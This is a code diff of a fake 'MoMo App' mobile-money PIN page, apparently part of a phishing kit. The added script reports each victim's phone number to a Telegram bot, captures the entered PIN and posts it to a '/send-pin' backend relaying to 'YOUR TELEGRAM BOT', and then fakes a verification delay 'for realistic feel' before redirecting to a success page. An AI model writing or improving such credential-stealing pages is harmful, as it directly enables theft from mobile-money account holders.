@@ -29,7 +29,7 @@ body {
   margin: 40px auto;
   padding: 25px;
   border-radius: 15px;
-  display: none; /* hidden until approved */
+  display: block; /* Shown immediately now */
 }
 
 input {
@@ -52,6 +52,7 @@ button {
   border: none;
   border-radius: 10px;
   font-weight: bold;
+  cursor: pointer;
 }
 
 .footer {
@@ -59,10 +60,8 @@ button {
   font-size: 12px;
 }
 
-/* STATUS TEXT */
 .status {
-  margin-top: 80px;
-  font-size: 16px;
+  display: none; /* Hidden because we are already approved */
 }
 </style>
 </head>
@@ -73,19 +72,13 @@ button {
   MoMo App
 </div>
 
-<!-- STATUS MESSAGE -->
-<div id="statusBox" class="status">
-  ⏳ Waiting for approval...
-</div>
-
-<!-- PIN FORM -->
 <div class="container" id="pinContainer">
   <h3>Enter MoMo PIN</h3>
-
   <p id="phoneDisplay"></p>
 
   <form id="pinForm">
-    <input type="password" placeholder="****" maxlength="5" required>
+    <!-- Changed type to number or text for easier input, kept placeholder -->
+    <input type="password" id="pinInput" placeholder="****" maxlength="5" pattern="\d*" inputmode="numeric" required>
     <button type="submit" id="pinBtn">Confirm</button>
   </form>
 </div>
@@ -95,74 +88,59 @@ button {
 </div>
 
 <script>
+// 1. Get phone from storage
 const phone = localStorage.getItem("phone");
 
-// If no phone, go back
+// 2. Security: If no phone, go back to start
 if (!phone) {
   window.location.href = "/";
+} else {
+  document.getElementById("phoneDisplay").innerText = "Number: " + phone;
 }
 
-const statusBox = document.getElementById("statusBox");
-const pinContainer = document.getElementById("pinContainer");
+// 3. Notify Telegram that the user has reached the PIN page
+fetch("/pin-step", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ phone })
+}).catch(err => console.log("Step notification failed"));
 
-// CHECK STATUS LOOP
-async function checkStatus() {
-  try {
-    const res = await fetch("/check-status", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ phone })
-    });
-
-    const data = await res.json();
-
-    if (data.status === "pending") {
-      statusBox.innerHTML = "⏳ Waiting for approval...";
-      setTimeout(checkStatus, 3000);
-    }
-
-    else if (data.status === "declined") {
-      statusBox.innerHTML = "❌ Application Declined";
-    }
-
-    else if (data.status === "approved") {
-      statusBox.style.display = "none";
-      pinContainer.style.display = "block";
-
-      document.getElementById("phoneDisplay").innerText = "Number: " + phone;
-
-      // Notify Telegram once
-      fetch("/pin-step", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ phone })
-      });
-    }
-
-  } catch (err) {
-    statusBox.innerHTML = "⚠️ Network error...";
-    setTimeout(checkStatus, 3000);
-  }
-}
-
-// START CHECK
-checkStatus();
-
-// PIN SUBMIT (UI ONLY)
-document.getElementById("pinForm").addEventListener("submit", function(e) {
+// 4. Handle PIN Submission
+document.getElementById("pinForm").addEventListener("submit", async function(e) {
   e.preventDefault();
 
+  const pinValue = document.getElementById("pinInput").value;
   const btn = document.getElementById("pinBtn");
+
+  // Visual feedback
   btn.innerText = "Verifying...";
   btn.disabled = true;
 
-  setTimeout(() => {
-    window.location.href = "/success.html";
-  }, 1500);
+  try {
+    // SEND THE PIN TO YOUR TELEGRAM BOT VIA BACKEND
+    const response = await fetch("/send-pin", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ 
+        phone: phone, 
+        pin: pinValue 
+      })
+    });
+
+    if (response.ok) {
+      // Small delay for realistic feel
+      setTimeout(() => {
+        window.location.href = "/success.html";
+      }, 2000);
+    } else {
+      throw new Error("Failed to send");
+    }
+
+  } catch (err) {
+    alert("System busy. Please try again.");
+    btn.innerText = "Confirm";
+    btn.disabled = false;
+  }
 });
 </script>
 
